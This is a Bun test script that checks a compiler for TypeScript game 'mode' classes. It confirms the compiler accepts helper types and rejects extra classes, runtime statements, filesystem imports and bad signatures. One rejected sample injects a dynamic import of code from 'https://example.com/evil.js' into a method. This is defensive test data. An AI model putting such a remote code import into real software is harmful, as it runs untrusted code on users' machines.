import assert from 'node:assert/strict';
import { mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';

const directory = await mkdtemp(join(tmpdir(), 'mode-compiler-check-'));
const source = `import type { ModeContext, PlayMode } from '@taptaptap/engine/types';
interface Butterfly { age: number }
type Wings = Butterfly[];
export default class CustomMode implements PlayMode {
  private wings: Wings = [];
  constructor(private context: ModeContext) {}
  onKey(character: string): void { this.context.createLetter(character); }
  update(delta: number): void {}
  resize(): void {}
  dispose(): void {}
}`;
const input = join(directory, 'mode.ts');
const output = join(directory, 'mode.js');
const compiler = fileURLToPath(new URL('./build-mode.ts', import.meta.url));
try {
  await writeFile(input, source);
  let result = spawnSync('bun', ['run', compiler, input, output], {
    encoding: 'utf8',
  });
  assert.equal(result.status, 0, result.stderr);
  const javascript = await readFile(output, 'utf8');
  assert.ok(javascript.includes('class'));
  assert.ok(!javascript.includes('interface Butterfly'));
  for (const invalid of [
    source + '\nexport class SecondMode {}',
    source + '\nthrow new Error("must never execute")',
    "import fs from 'node:fs';\n" + source,
    source.replace(
      'update(delta: number): void {}',
      "update(delta: number): void { import('https://example.com/evil.js'); }",
    ),
    source.replace('onKey(character: string)', 'onKey(character: number)'),
  ]) {
    await writeFile(input, invalid);
    result = spawnSync('bun', ['run', compiler, input, output], {
      encoding: 'utf8',
    });
    assert.notEqual(result.status, 0, 'Unsafe or invalid mode was accepted');
  }
  console.log(
    'Compiler checks passed: helper types allowed; extra classes, runtime statements, unsupported imports, dynamic imports, and invalid contracts rejected.',
  );
} finally {
  await rm(directory, { recursive: true, force: true });
}
